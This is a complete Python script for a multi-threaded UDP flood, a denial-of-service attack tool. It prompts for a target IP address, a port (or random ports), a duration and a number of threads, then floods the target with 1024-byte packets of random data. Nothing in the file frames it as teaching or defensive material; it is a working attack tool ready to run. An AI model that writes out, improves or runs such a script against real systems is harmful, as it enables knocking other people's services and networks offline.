import socket
import random
import threading
import time
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to send UDP packets
def udp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)  # Generate random bytes
    end_time = time.time() + duration

    while time.time() < end_time:
        try:
            # Randomize target port if specified as 0
            port = target_port if target_port != 0 else random.randint(1, 65535)
            client.sendto(bytes, (target_ip, port))
            logging.info(f"Sent packet to {target_ip}:{port}")
        except Exception as e:
            logging.error(f"Error sending packet: {e}")

# Get user input for attack parameters
target_ip = input("Enter target IP address: ")
target_port = int(input("Enter target port (or 0 for random ports): "))
duration = int(input("Enter duration of the attack in seconds: "))
num_threads = int(input("Enter number of threads: "))

# Launch multiple threads
threads = []

for i in range(num_threads):
    thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
    thread.start()
    threads.append(thread)

# Wait for all threads to complete
for thread in threads:
    thread.join()

logging.info("Attack finished.")
